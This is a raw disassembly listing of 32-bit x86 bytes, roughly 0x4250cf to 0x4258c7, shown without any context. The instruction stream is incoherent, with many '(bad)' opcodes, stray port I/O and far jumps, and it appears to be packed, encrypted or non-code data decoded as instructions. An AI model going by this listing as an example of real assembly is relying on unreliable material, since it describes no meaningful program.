  4250cf:	pop    ecx
  4250d0:	xor    ebp,ebp
  4250d2:	add    al,0xfc
  4250d4:	popa   
  4250d5:	pushf  
  4250d6:	test   eax,0xb47582c5
  4250db:	addr16 (bad) 
  4250dd:	fimul  WORD PTR [ecx]
  4250df:	neg    BYTE PTR [eax+0x76bc1391]
  4250e5:	push   cs
  4250e6:	xor    edi,esi
  4250e8:	imul   edi,DWORD PTR [esi+0x32],0xffffffa2
  4250ec:	jp     0x4250cd
  4250ee:	cmp    eax,0x2d1a9df7
  4250f3:	(bad)  
  4250f4:	mov    esi,0xf2c4b20c
  4250f9:	xchg   ebx,eax
  4250fa:	mov    ebx,0xe42b3693
  4250ff:	sub    BYTE PTR [edx+0xdc5078],dh
  425105:	add    BYTE PTR [eax],al
  425107:	add    BYTE PTR [eax],al
  425109:	add    BYTE PTR [ecx+0x55],bl
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x763b5f96
  425119:	inc    ecx
  42511a:	out    dx,al
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [edx+0x2e000006],al
  425123:	jg     0x425167
  425125:	xor    eax,0x74605c4c
  42512a:	sbb    BYTE PTR [ebp+0x6b],dl
  42512d:	xchg   edi,eax
  42512e:	enter  0x7292,0x43
  425132:	outs   dx,DWORD PTR ds:[esi]
  425133:	mov    ch,0xd7
  425135:	outs   dx,BYTE PTR ds:[esi]
  425136:	xlat   BYTE PTR ds:[ebx]
  425137:	cdq    
  425138:	dec    BYTE PTR [eax]
  42513a:	lahf   
  42513b:	outs   dx,BYTE PTR ds:[esi]
  42513c:	ror    BYTE PTR [eax],1
  42513e:	push   ebp
  42513f:	and    edx,ebp
  425141:	xlat   BYTE PTR ds:[ebx]
  425142:	aam    0xc3
  425144:	xchg   ebp,eax
  425145:	push   ds
  425146:	test   eax,0x2363b61d
  42514b:	in     al,dx
  42514c:	fwait
  42514d:	mov    ecx,0xc959294b
  425152:	test   BYTE PTR [edx+0x638210e5],0x48
  425159:	adc    edi,DWORD PTR [esi]
  42515b:	or     eax,0x863d7e72
  425160:	stos   BYTE PTR es:[edi],al
  425161:	push   ebx
  425162:	rol    DWORD PTR [ebx],cl
  425164:	adc    esi,DWORD PTR [ebx]
  425166:	push   esp
  425167:	mov    BYTE PTR [edi-0x30],dh
  42516a:	outs   dx,DWORD PTR ds:[esi]
  42516b:	aaa    
  42516c:	mov    bl,0x26
  42516e:	pop    esi
  42516f:	add    eax,0xd0293fcd
  425174:	les    eax,FWORD PTR [eax*2+0x74f4e395]
  42517b:	mov    esp,0xea4f137c
  425180:	pop    edx
  425181:	in     eax,dx
  425182:	or     BYTE PTR [esp+edi*2-0x6f],bh
  425186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425187:	pop    eax
  425188:	popf   
  425189:	lea    eax,[edx-0x4755bdfb]
  42518f:	enter  0xc0c0,0x1f
  425193:	mov    edi,DWORD PTR [edi+0x65d30780]
  425199:	push   ds
  42519a:	into   
  42519b:	pop    ecx
  42519c:	adc    cl,ah
  42519e:	jns    0x42512f
  4251a0:	into   
  4251a1:	test   esi,eax
  4251a3:	pop    esp
  4251a4:	jl     0x42516b
  4251a6:	mov    dl,0x22
  4251a8:	inc    edi
  4251a9:	ss dec ecx
  4251ab:	xchg   esp,eax
  4251ac:	jbe    0x425131
  4251ae:	jb     0x4251bc
  4251b0:	enter  0x9000,0xb2
  4251b4:	xchg   ecx,eax
  4251b5:	add    DWORD PTR [ebx+esi*8-0x42d79bdc],0xffffffc9
  4251bd:	mov    esi,0x196167cb
  4251c2:	cli    
  4251c3:	mov    eax,ds:0xec7f3493
  4251c8:	mov    esi,0xd2d95062
  4251cd:	sar    BYTE PTR [ebx],0xaa
  4251d0:	xchg   DWORD PTR [edx-0x36],ebx
  4251d3:	xor    eax,0xd8a7b298
  4251d8:	inc    edi
  4251d9:	xchg   DWORD PTR [edx],esp
  4251db:	add    BYTE PTR [edx],ah
  4251dd:	xor    BYTE PTR [edi],ah
  4251df:	mov    esi,0x526d5bd6
  4251e4:	cli    
  4251e5:	or     ebp,DWORD PTR [ebp+0x62]
  4251e8:	push   esi
  4251e9:	sbb    DWORD PTR [esi-0x442db73],ecx
  4251ef:	aas    
  4251f0:	jl     0x425175
  4251f2:	cld    
  4251f3:	fistp  WORD PTR [ebp+0x7d3e60d8]
  4251f9:	stc    
  4251fa:	call   0x10892691
  4251ff:	xor    BYTE PTR [ecx*2+0x3f8da403],dl
  425206:	xchg   esp,eax
  425207:	xchg   ebp,eax
  425208:	aaa    
  425209:	(bad)  
  42520a:	test   al,0x55
  42520c:	sub    BYTE PTR cs:[bp-0x7185],0x17
  425213:	cmp    edi,edi
  425215:	stc    
  425216:	adc    DWORD PTR ds:0xf810fedd,0x4a29816f
  425220:	push   ebp
  425221:	mov    al,BYTE PTR [edi-0x56]
  425224:	int    0x2b
  425226:	sahf   
  425227:	test   BYTE PTR [eax],ah
  425229:	or     BYTE PTR [edi-0x2e2b535b],bl
  42522f:	xlat   BYTE PTR fs:[ebx]
  425231:	jo     0x425273
  425233:	add    DWORD PTR [ebx+0x1060204e],ecx
  425239:	sbb    DWORD PTR [ecx+esi*8],ebx
  42523c:	cmp    BYTE PTR [ebx+0x1e5e99e7],al
  425242:	add    al,0x7a
  425244:	xchg   ebx,eax
  425245:	mov    bl,0x7f
  425247:	sbb    ch,BYTE PTR [ebp+0x44]
  42524a:	xor    ebp,0x9a2abf07
  425250:	lods   eax,DWORD PTR ds:[esi]
  425251:	iret   
  425252:	adc    DWORD PTR [edi-0x1c701154],0xa5956b7
  42525c:	aam    0x76
  42525e:	scas   eax,DWORD PTR es:[edi]
  42525f:	inc    ecx
  425260:	jb     0x4252ae
  425262:	fistp  QWORD PTR [eax-0x3ee6c5ba]
  425268:	fldpi  
  42526a:	(bad)  
  42526b:	sub    ah,BYTE PTR [eax+0x7a]
  42526e:	stc    
  42526f:	cld    
  425270:	and    DWORD PTR [ebp+0x8],edx
  425273:	es inc eax
  425275:	and    ebx,DWORD PTR [eax-0x39]
  425278:	or     eax,0x365ec294
  42527d:	(bad)  
  42527e:	shr    ah,1
  425280:	int    0xe7
  425282:	push   eax
  425283:	or     BYTE PTR es:[edi-0xe6b52d2],bl
  42528a:	ret    
  42528b:	pop    edi
  42528c:	or     al,0x75
  42528e:	je     0x4252d7
  425290:	arpl   WORD PTR [ebx-0x5715487d],dx
  425296:	sbb    DWORD PTR [edx+0x3cddc5c1],edx
  42529c:	adc    eax,0xae6e0925
  4252a1:	dec    esp
  4252a2:	aad    0xf7
  4252a4:	pop    ds
  4252a5:	mov    eax,0x1f099ec1
  4252aa:	popf   
  4252ab:	cdq    
  4252ac:	js     0x42525f
  4252ae:	adc    eax,0x190f8ca5
  4252b3:	or     DWORD PTR [ecx-0x28579067],ecx
  4252b9:	into   
  4252ba:	or     al,0x3e
  4252bc:	sbb    al,0xf0
  4252be:	add    DWORD PTR [bp+si],edx
  4252c1:	std    
  4252c2:	add    al,0x32
  4252c4:	call   0xac4bccec
  4252c9:	pop    ebx
  4252ca:	pop    edi
  4252cb:	mov    ebx,0x197e9a8c
  4252d0:	cmp    ebp,esi
  4252d2:	cdq    
  4252d3:	xchg   ebp,eax
  4252d4:	sub    DWORD PTR [ebx],esi
  4252d6:	xor    al,BYTE PTR [ebx+0x61ba28ed]
  4252dc:	mov    dh,0xc7
  4252de:	(bad)  
  4252df:	icebp  
  4252e0:	inc    edi
  4252e1:	xor    eax,esi
  4252e3:	push   cs
  4252e4:	inc    ecx
  4252e5:	jbe    0x425348
  4252e7:	fcomp  DWORD PTR [esi]
  4252e9:	push   esp
  4252ea:	xor    eax,0x5f1d728c
  4252ef:	cmp    BYTE PTR [ebx],ch
  4252f1:	leave  
  4252f2:	lahf   
  4252f3:	dec    ebx
  4252f4:	mov    bh,0x1d
  4252f6:	shl    DWORD PTR [edx-0x2f6a2cf2],cl
  4252fc:	xchg   DWORD PTR [edi+0x7a],ebp
  4252ff:	inc    ecx
  425300:	gs dec eax
  425302:	jne    0x4252c5
  425304:	cld    
  425305:	gs jne 0x4252f1
  425308:	add    DWORD PTR [ebp+0x3278c0c],0x5ddf98a5
  425312:	mov    bh,0xcc
  425314:	jo     0x42532d
  425316:	xor    DWORD PTR ds:0xc1eed56a,0xffffff98
  42531d:	push   ds
  42531e:	or     eax,0x1f479dcb
  425323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425324:	retf   0xa0e6
  425327:	cmp    al,0x0
  425329:	call   0x9fd:0x5722b642
  425330:	inc    edi
  425331:	xchg   ebp,eax
  425332:	ins    DWORD PTR es:[edi],dx
  425333:	mov    esp,0x3356a12f
  425338:	(bad)  
  425339:	fistp  DWORD PTR [edi-0x2b]
  42533c:	or     edx,DWORD PTR ds:0xb6007ca2
  425342:	mov    bl,0x35
  425344:	lods   al,BYTE PTR ds:[esi]
  425345:	cmp    DWORD PTR [ecx+0x6fbcbd90],0x71
  42534c:	aam    0x6a
  42534e:	adc    ebx,DWORD PTR [edi+edi*1+0x4ced9f76]
  425355:	loop   0x42538a
  425357:	inc    edx
  425358:	shl    DWORD PTR [edi+ecx*2],cl
  42535b:	mov    al,0x58
  42535d:	mov    ds:0xe8c2aac5,eax
  425362:	mov    ebx,gs
  425364:	fnstenv [edi-0x357896cc]
  42536a:	sbb    al,0xbf
  42536c:	push   ss
  42536d:	mov    al,ds:0x6d9d68dc
  425372:	test   esp,ebx
  425374:	add    ch,ah
  425376:	jg     0x42533c
  425378:	rcl    DWORD PTR [ecx-0x7d],1
  42537b:	dec    esp
  42537c:	sub    eax,DWORD PTR [esi-0x4ace3eb1]
  425382:	cs and eax,0x5061cda0
  425388:	imul   esp,DWORD PTR [ecx+0x79],0x348bc5d0
  42538f:	mov    dl,BYTE PTR [esp+ebx*2-0x5fbd2d09]
  425396:	das    
  425397:	ins    BYTE PTR es:[edi],dx
  425398:	mov    ch,0xec
  42539a:	dec    edi
  42539b:	cld    
  42539c:	inc    DWORD PTR [edi+0x3b]
  42539f:	test   al,0x93
  4253a1:	test   eax,0x2cfafa97
  4253a6:	mov    al,ds:0x3597afc6
  4253ab:	ins    DWORD PTR es:[edi],dx
  4253ac:	adc    ah,bh
  4253ae:	hlt    
  4253af:	pusha  
  4253b0:	add    bl,BYTE PTR [eax+0x5cdf1ca5]
  4253b6:	imul   ecx,DWORD PTR [edi-0x7f46f59c],0xa0bd9204
  4253c0:	mov    bh,0xc5
  4253c2:	jne    0x425443
  4253c4:	or     eax,0xc932adbb
  4253c9:	mov    bl,0x2f
  4253cb:	cmp    DWORD PTR [eax-0x44],ebx
  4253ce:	pusha  
  4253cf:	scas   al,BYTE PTR es:[edi]
  4253d0:	or     eax,0x2798ea43
  4253d5:	xchg   esi,eax
  4253d6:	ins    DWORD PTR es:[edi],dx
  4253d7:	sbb    ebx,ecx
  4253d9:	and    BYTE PTR [esi],ah
  4253db:	xchg   edi,eax
  4253dc:	dec    edi
  4253dd:	frstor [ecx+0x63]
  4253e0:	nop
  4253e1:	push   ss
  4253e2:	jge    0x425417
  4253e4:	cmp    eax,0x2189c248
  4253e9:	(bad)  
  4253ea:	ret    
  4253eb:	adc    eax,edi
  4253ed:	mov    eax,ds:0x3afeb3f3
  4253f2:	adc    DWORD PTR [ebx-0x71ee159d],edi
  4253f8:	fwait
  4253f9:	in     eax,dx
  4253fa:	or     BYTE PTR [ecx+0x6b],ch
  4253fd:	scas   eax,DWORD PTR es:[edi]
  4253fe:	arpl   WORD PTR [ebx-0x34],cx
  425401:	mov    ?,WORD PTR [eax-0x71bb9b65]
  425407:	outs   dx,BYTE PTR ds:[esi]
  425408:	sub    edx,esi
  42540a:	test   eax,0x1dee6111
  42540f:	ins    BYTE PTR es:[edi],dx
  425410:	add    ecx,DWORD PTR gs:[eax+edx*8+0xbb852ad]
  425418:	pop    es
  425419:	aad    0x89
  42541b:	(bad)  
  42541c:	stos   DWORD PTR es:[edi],eax
  42541d:	cmp    edi,edi
  42541f:	xchg   edx,eax
  425420:	and    BYTE PTR [eax-0x9c205b7],dl
  425426:	(bad)  
  425427:	cmp    DWORD PTR [esi],esp
  425429:	jmp    0x4253ae
  42542b:	ins    BYTE PTR es:[edi],dx
  42542c:	cmp    BYTE PTR [ebp+0x66],0x6b
  425430:	push   ebx
  425431:	mov    esi,0xed3a347f
  425436:	int    0xe7
  425438:	mov    cl,ah
  42543a:	push   edx
  42543b:	adc    al,0x32
  42543d:	jo     0x425445
  42543f:	aaa    
  425440:	out    0x40,eax
  425442:	xor    esp,ebx
  425444:	bound  eax,QWORD PTR ds:0x3eb37f82
  42544a:	cs jl  0x4253da
  42544d:	arpl   WORD PTR [eax],bx
  42544f:	pop    edi
  425450:	or     DWORD PTR [eax-0x1c4f5e3c],eax
  425456:	inc    edi
  425457:	test   al,0x93
  425459:	imul   ecx,esp,0xffffffe7
  42545c:	sti    
  42545d:	(bad)  
  42545e:	mov    bl,0xf6
  425460:	inc    ebp
  425461:	pop    ebp
  425462:	repnz push esp
  425464:	in     al,dx
  425465:	mov    BYTE PTR [edi+0x3d],bh
  425468:	cs lock xchg ecx,eax
  42546b:	das    
  42546c:	jo     0x4254d3
  42546e:	sbb    BYTE PTR [edi+edx*8],bh
  425471:	mov    ss:0x2f603060,eax
  425477:	xchg   edx,eax
  425478:	bswap  esp
  42547a:	xor    dl,0x94
  42547d:	ins    BYTE PTR es:[edi],dx
  42547e:	iret   
  42547f:	(bad)  
  425480:	mov    dh,0xf6
  425482:	inc    edi
  425483:	lods   eax,DWORD PTR es:[esi]
  425485:	sub    eax,ebx
  425487:	push   esp
  425488:	push   0xf5659a2
  42548d:	fidiv  DWORD PTR [esi+0x22433083]
  425493:	cmc    
  425494:	jbe    0x4254d4
  425496:	(bad)  
  425497:	cmc    
  425498:	(bad)  
  425499:	nop
  42549a:	in     eax,dx
  42549b:	(bad)  
  42549c:	je     0x4254e1
  42549e:	jmp    0xf8dc:0xed8dbfcf
  4254a5:	fcom   QWORD PTR [eax+edi*4]
  4254a8:	cdq    
  4254a9:	ins    BYTE PTR es:[edi],dx
  4254aa:	mov    ebp,0xaf9e6333
  4254af:	mul    BYTE PTR cs:0x889e2bfd
  4254b6:	add    BYTE PTR [edx+0x57a39cf5],ch
  4254bc:	and    DWORD PTR [ecx+0xc48fe51],eax
  4254c2:	fwait
  4254c3:	not    BYTE PTR [eax-0x15]
  4254c6:	xchg   edi,eax
  4254c7:	fs pusha 
  4254c9:	test   DWORD PTR [edi+0x7],ebx
  4254cc:	sub    eax,0xd436c77
  4254d1:	or     cl,cl
  4254d3:	test   DWORD PTR [edx-0x7a],0x2a6fe496
  4254da:	pop    esp
  4254db:	mov    edi,edx
  4254dd:	jecxz  0x425520
  4254df:	lods   al,BYTE PTR ds:[esi]
  4254e0:	sahf   
  4254e1:	and    al,0x91
  4254e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254e4:	shl    DWORD PTR [eax],1
  4254e6:	pop    es
  4254e7:	ins    DWORD PTR es:[edi],dx
  4254e8:	and    cl,BYTE PTR [edx]
  4254ea:	xchg   esp,eax
  4254eb:	push   esi
  4254ec:	cmp    DWORD PTR [eax],edi
  4254ee:	or     BYTE PTR [ecx],ch
  4254f0:	sti    
  4254f1:	jne    0x4254e0
  4254f3:	xchg   ebp,eax
  4254f4:	pop    ebp
  4254f5:	iret   
  4254f6:	imul   ebx,edx,0x3d
  4254f9:	lods   eax,DWORD PTR ds:[esi]
  4254fa:	cwde   
  4254fb:	jg     0x42552e
  4254fd:	cmp    eax,0xcc738c6a
  425502:	dec    eax
  425503:	addr16 or eax,0xa28e862b
  425509:	jo     0x4254e8
  42550b:	int3   
  42550c:	ds mov edx,0x529d0a22
  425512:	cdq    
  425513:	or     eax,0x1484d18f
  425518:	rol    BYTE PTR [ebp+0x64],1
  42551b:	xor    al,0xd8
  42551d:	cmp    DWORD PTR [ebx-0x6c573761],0x4f
  425524:	fcmovnu st,st(7)
  425526:	inc    ebx
  425527:	iret   
  425528:	inc    edi
  425529:	xor    BYTE PTR [eax-0x2057ed8e],ah
  42552f:	xlat   BYTE PTR ds:[ebx]
  425530:	clc    
  425531:	adc    DWORD PTR ss:[edi+0xdfb56fc],ebx
  425538:	xor    DWORD PTR [eax+0x63],0x7f
  42553c:	dec    esi
  42553d:	push   esp
  42553e:	loope  0x4255bb
  425540:	fprem1 
  425542:	adc    dh,BYTE PTR [esi+0x5a]
  425545:	ins    BYTE PTR es:[edi],dx
  425546:	push   0x51
  425548:	gs call 0x63f0a105
  42554e:	loopne 0x42553e
  425550:	adc    eax,DWORD PTR [edx]
  425552:	icebp  
  425553:	int3   
  425554:	sub    ecx,0xffffffbf
  425557:	mov    edi,0xbc8d0008
  42555c:	pushf  
  42555d:	fmul   QWORD PTR [ebx]
  42555f:	pop    esi
  425560:	mov    esi,0xd81691bf
  425565:	bnd je 0x4255d6
  425568:	xchg   esi,eax
  425569:	push   es
  42556a:	push   ecx
  42556b:	sar    edi,cl
  42556d:	jbe    0x42558e
  42556f:	icebp  
  425570:	bound  esp,QWORD PTR [ecx]
  425572:	popa   
  425573:	jne    0x4255be
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	sub    BYTE PTR [esi+0x38a23130],ch
  42557c:	jge    0x42553e
  42557e:	jecxz  0x42553d
  425580:	imul   esi,DWORD PTR [esi],0xffffffdd
  425583:	mov    cl,0xbc
  425585:	mov    ds:0x45b486,eax
  42558a:	mov    esi,0x8701de0d
  42558f:	std    
  425590:	dec    ecx
  425591:	(bad)  
  425592:	stc    
  425593:	add    edx,DWORD PTR [esi+0x502d272]
  425599:	push   ebx
  42559a:	jno    0x4255fd
  42559c:	popa   
  42559d:	mov    eax,ds:0x371fb5ed
  4255a2:	es in  eax,dx
  4255a4:	mov    bh,0x9a
  4255a6:	inc    ebp
  4255a7:	fcomp  QWORD PTR [edi-0x2bf89814]
  4255ad:	push   ds
  4255ae:	pop    edi
  4255af:	mov    dl,0x7a
  4255b1:	nop
  4255b2:	xor    BYTE PTR [edi+eiz*1+0x4e],bl
  4255b6:	clc    
  4255b7:	das    
  4255b8:	mov    ds:0xff7df810,al
  4255bd:	stos   DWORD PTR es:[edi],eax
  4255be:	add    al,0x26
  4255c0:	xchg   esi,eax
  4255c1:	mov    ?,ebx
  4255c3:	pop    ebp
  4255c4:	call   0x7823:0xdaae3624
  4255cb:	aaa    
  4255cc:	cmc    
  4255cd:	mov    esp,0xd1e9484d
  4255d2:	adc    DWORD PTR [edx],ebx
  4255d4:	imul   DWORD PTR [edi+0x6c]
  4255d7:	pmulhuw mm2,mm2
  4255da:	out    0x6b,al
  4255dc:	rol    BYTE PTR [esi+0x2d],1
  4255df:	out    dx,al
  4255e0:	xchg   edx,eax
  4255e1:	mov    ch,0xa9
  4255e3:	(bad)  
  4255e4:	sub    bh,al
  4255e6:	push   ebp
  4255e7:	call   0x4df509c0
  4255ec:	test   eax,0xaf2aa768
  4255f1:	sub    al,dh
  4255f3:	cmp    al,0xfb
  4255f5:	cdq    
  4255f6:	dec    esi
  4255f7:	data16 mov bh,0xd
  4255fa:	jp     0x425606
  4255fc:	dec    esi
  4255fd:	sbb    eax,0x964a8412
  425602:	out    dx,eax
  425603:	mov    ah,0x10
  425605:	lds    ecx,FWORD PTR [esi+0x7ff3cf4b]
  42560b:	push   0x2f
  42560d:	and    dh,0xcc
  425610:	cmp    ecx,DWORD PTR [ebx]
  425612:	xchg   esp,eax
  425613:	mov    ebx,esi
  425615:	sub    BYTE PTR [ecx],dl
  425617:	push   edi
  425618:	gs mov al,0x78
  42561c:	pop    ecx
  42561d:	mov    esp,0x17cb9fa1
  425622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425623:	inc    ecx
  425624:	mov    ebx,0xc0e41893
  425629:	sbb    BYTE PTR [eax-0x1f262ca2],cl
  42562f:	test   al,0x88
  425631:	mov    al,ds:0xde37d03a
  425636:	dec    edx
  425637:	inc    ebp
  425638:	shl    ebx,cl
  42563a:	daa    
  42563b:	dec    edx
  42563c:	and    BYTE PTR [ecx-0x61],dh
  42563f:	add    ebx,ecx
  425641:	cs in  al,dx
  425643:	jae    0x42561e
  425645:	push   cs
  425646:	repz sbb ecx,edx
  425649:	ror    DWORD PTR [eax+ebx*1-0xc8e54e0],0x3c
  425651:	icebp  
  425652:	in     eax,0xd7
  425654:	out    0xa4,eax
  425656:	enter  0xd0fb,0x23
  42565a:	inc    edx
  42565b:	dec    esp
  42565c:	or     BYTE PTR [ebx+esi*2],bh
  42565f:	xchg   ecx,eax
  425660:	addr16 dec ecx
  425662:	shl    DWORD PTR [edi-0x77],0x48
  425666:	stos   DWORD PTR es:[edi],eax
  425667:	fsubr  st,st(3)
  425669:	inc    ecx
  42566a:	cmp    ebx,ebp
  42566c:	std    
  42566d:	aaa    
  42566e:	sbb    eax,0x886ba91c
  425673:	cmp    cl,al
  425675:	arpl   bp,sp
  425677:	or     BYTE PTR [esi-0x287ca881],0xd2
  42567e:	int3   
  42567f:	cmp    eax,0xa591d14e
  425684:	aas    
  425685:	imul   edx,ebp,0xa71881c
  42568b:	mov    ds:0xc777c87b,eax
  425690:	jne    0x425677
  425692:	inc    esi
  425693:	test   eax,0x1a7ab302
  425698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425699:	pushf  
  42569a:	xchg   esp,eax
  42569b:	pop    ecx
  42569c:	add    BYTE PTR [eax+0x35ff2a90],dh
  4256a2:	mov    esp,0xf581a997
  4256a7:	xchg   edi,eax
  4256a8:	dec    eax
  4256a9:	sbb    al,0xa0
  4256ab:	sub    DWORD PTR [ebp+0x15],edx
  4256ae:	push   0xd8d91e70
  4256b3:	sub    eax,edx
  4256b5:	mov    eax,ds:0xb8179c7f
  4256ba:	sbb    al,0x8c
  4256bc:	push   ebp
  4256bd:	xchg   ecx,eax
  4256be:	push   ds
  4256bf:	and    eax,DWORD PTR [edx]
  4256c1:	adc    DWORD PTR [esi-0x11],esp
  4256c4:	jge    0x425706
  4256c6:	not    DWORD PTR [esi+0x74]
  4256c9:	jne    0x4256f2
  4256cb:	add    DWORD PTR [eax-0x17],ebp
  4256ce:	pop    edi
  4256cf:	pop    es
  4256d0:	add    ebx,ecx
  4256d2:	test   BYTE PTR [ebx+ebx*2-0xe],bl
  4256d6:	enter  0x180c,0xf5
  4256da:	jns    0x4256b9
  4256dc:	das    
  4256dd:	int3   
  4256de:	cld    
  4256df:	cmp    ah,bl
  4256e1:	mov    edx,0x6c60b879
  4256e6:	push   0xedc8a7c2
  4256eb:	adc    al,0xec
  4256ed:	lahf   
  4256ee:	jb     0x4256ab
  4256f0:	out    dx,al
  4256f1:	nop
  4256f2:	adc    DWORD PTR [eax-0x6ba258cc],esi
  4256f8:	cmp    eax,0x8f7761f9
  4256fd:	jae    0x42572d
  4256ff:	or     esp,DWORD PTR [edx+0x59aa6d97]
  425705:	push   ebx
  425706:	in     eax,dx
  425707:	and    bl,0xbc
  42570a:	sbb    BYTE PTR [ecx],bh
  42570c:	dec    eax
  42570d:	into   
  42570e:	into   
  42570f:	dec    ecx
  425710:	mov    bl,0x7b
  425712:	js     0x4256b3
  425714:	xchg   DWORD PTR [esi-0x7b],ebx
  425717:	bound  ebp,QWORD PTR [esi+ebp*4+0x37df5df9]
  42571e:	imul   edi,DWORD PTR [ecx],0xffffffc0
  425721:	sub    eax,0xf07fa8a5
  425726:	inc    ecx
  425727:	icebp  
  425728:	inc    esp
  425729:	loop   0x4256fe
  42572b:	fwait
  42572c:	call   0x24a8:0x8c571d4e
  425733:	rol    BYTE PTR [ebx],1
  425735:	mov    esp,0x53915ef5
  42573a:	mov    edx,0xdf153117
  42573f:	add    ebp,edi
  425741:	mov    ?,ebx
  425743:	cli    
  425744:	ror    DWORD PTR [edx+0x4a14d840],0xa5
  42574b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42574c:	sub    al,0x49
  42574e:	inc    esi
  42574f:	iret   
  425750:	pop    eax
  425751:	sbb    eax,0xe0cb5c29
  425756:	pop    ecx
  425757:	rcl    BYTE PTR [ecx+0x7],0xec
  42575b:	and    DWORD PTR [edi-0x2101757f],ebx
  425761:	inc    eax
  425762:	xchg   ebp,eax
  425763:	sti    
  425764:	xchg   esp,eax
  425765:	cmc    
  425766:	xor    DWORD PTR [esi+esi*1+0x4ee8ac00],eax
  42576d:	mov    edi,0x55df6990
  425772:	sbb    eax,0xf773025c
  425777:	inc    eax
  425778:	ins    DWORD PTR es:[edi],dx
  425779:	pop    ss
  42577a:	dec    eax
  42577b:	mov    dl,0x55
  42577d:	scas   eax,DWORD PTR es:[edi]
  42577e:	xchg   edx,eax
  42577f:	in     al,dx
  425780:	inc    ebx
  425781:	int3   
  425782:	push   ss
  425783:	fldcw  WORD PTR [esi-0x4a75ef56]
  425789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42578a:	add    cl,BYTE PTR [edx+0x43283112]
  425790:	loope  0x425804
  425792:	or     cl,al
  425794:	dec    ebx
  425795:	dec    edx
  425796:	mov    ds:0xaf898ac2,al
  42579b:	rcl    DWORD PTR [ebx-0x245a573f],cl
  4257a1:	clc    
  4257a2:	push   ecx
  4257a3:	test   DWORD PTR [eax],0x0
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	pop    esi
  4257b9:	jne    0x42582b
  4257bb:	in     eax,0x1
  4257bd:	add    BYTE PTR [edx-0x5fffffa],al
  4257c3:	sti    
  4257c4:	mov    DWORD PTR [eax],ebx
  4257c6:	mov    DWORD PTR [esi-0x16f3085],esp
  4257cc:	mov    al,ds:0x7ccfb3bd
  4257d1:	pop    esi
  4257d2:	cmp    BYTE PTR [esi],dh
  4257d4:	popa   
  4257d5:	inc    edx
  4257d6:	mov    esp,0x9e3b500c
  4257db:	pop    ebx
  4257dc:	rcl    BYTE PTR ds:0x359955f7,cl
  4257e2:	sub    DWORD PTR [ebx-0xd],ebx
  4257e5:	cmp    BYTE PTR [bx-0x56],cl
  4257e9:	xor    BYTE PTR [ebx-0x42bdf410],0xfc
  4257f0:	and    bh,BYTE PTR [eax+0x63]
  4257f3:	jle    0x425837
  4257f5:	push   esp
  4257f6:	stc    
  4257f7:	xchg   esi,eax
  4257f8:	pop    ecx
  4257f9:	pop    ecx
  4257fa:	loop   0x425800
  4257fc:	push   ebp
  4257fd:	cld    
  4257fe:	and    DWORD PTR [edi-0x7f],edx
  425801:	in     al,0x70
  425803:	je     0x42579c
  425805:	jne    0x42581a
  425807:	aaa    
  425808:	add    eax,0x31ae743c
  42580d:	jmp    0x9844:0xee3eda9f
  425814:	pop    ds
  425815:	jb     0x42586a
  425817:	fwait
  425818:	add    ch,BYTE PTR [ecx-0x12]
  42581b:	push   es
  42581c:	mov    cl,0xd1
  42581e:	imul   BYTE PTR fs:[edx+0x13027340]
  425825:	ds jo  0x4257f6
  425828:	sbb    bl,BYTE PTR [ecx]
  42582a:	mov    ebp,fs
  42582c:	pop    edx
  42582e:	ficom  WORD PTR [esi+0x8f6b831]
  425834:	(bad)  
  425835:	jle    0x425853
  425837:	adc    al,0xdd
  425839:	nop
  42583a:	xchg   ebx,eax
  42583b:	or     esp,DWORD PTR [edi+eiz*1]
  42583e:	push   cs
  42583f:	inc    ebx
  425840:	addr16 push 0xbf285a37
  425846:	xlat   BYTE PTR ds:[ebx]
  425847:	dec    eax
  425848:	push   0xffffffc3
  42584a:	mov    ecx,0x5fb73c57
  42584f:	mov    ebp,0x465129ac
  425854:	out    dx,al
  425855:	jmp    0x4258be
  425857:	pop    esi
  425858:	cmp    DWORD PTR [eax+0x10cddb5a],edi
  42585e:	hlt    
  42585f:	dec    edx
  425860:	iret   
  425861:	scas   al,BYTE PTR es:[edi]
  425862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425863:	jmp    0x1c523504
  425868:	jl     0x42587c
  42586a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42586b:	sbb    eax,DWORD PTR [ebx-0x3a]
  42586e:	enter  0xde7d,0xea
  425872:	fcom   st(1)
  425874:	sbb    al,0x4e
  425876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425877:	cmp    bh,0xc4
  42587a:	cmp    DWORD PTR [esi*8+0x2d3e7bb4],0xffffffa9
  425882:	push   0x4e21853c
  425887:	push   cs
  425888:	pop    edx
  425889:	fimul  DWORD PTR [edi+edx*8]
  42588c:	push   eax
  42588d:	shl    DWORD PTR [edi+ecx*2-0x65aa74a],cl
  425894:	bound  edi,QWORD PTR [ecx+0x50]
  425897:	enter  0x1cbe,0x4c
  42589b:	or     BYTE PTR [edi],bh
  42589d:	mov    cl,0x26
  42589f:	jge    0x4258bf
  4258a1:	retf   0x8e08
  4258a4:	out    0xdc,eax
  4258a6:	mov    edx,0x1e1dbcd1
  4258ab:	loope  0x42582d
  4258ad:	enter  0x3965,0x5f
  4258b1:	aam    0xc8
  4258b3:	mov    ds:0xd2448e33,eax
  4258b8:	add    al,0x8c
  4258ba:	jo     0x425911
  4258bc:	mov    bl,0xcf
  4258be:	(bad)
  4258c2:	leave  
  4258c3:	jmp    0x4258ac
  4258c5:	lods   eax,DWORD PTR ds:[esi]
  4258c6:	aaa    
  4258c7:	xchg   esi,eax
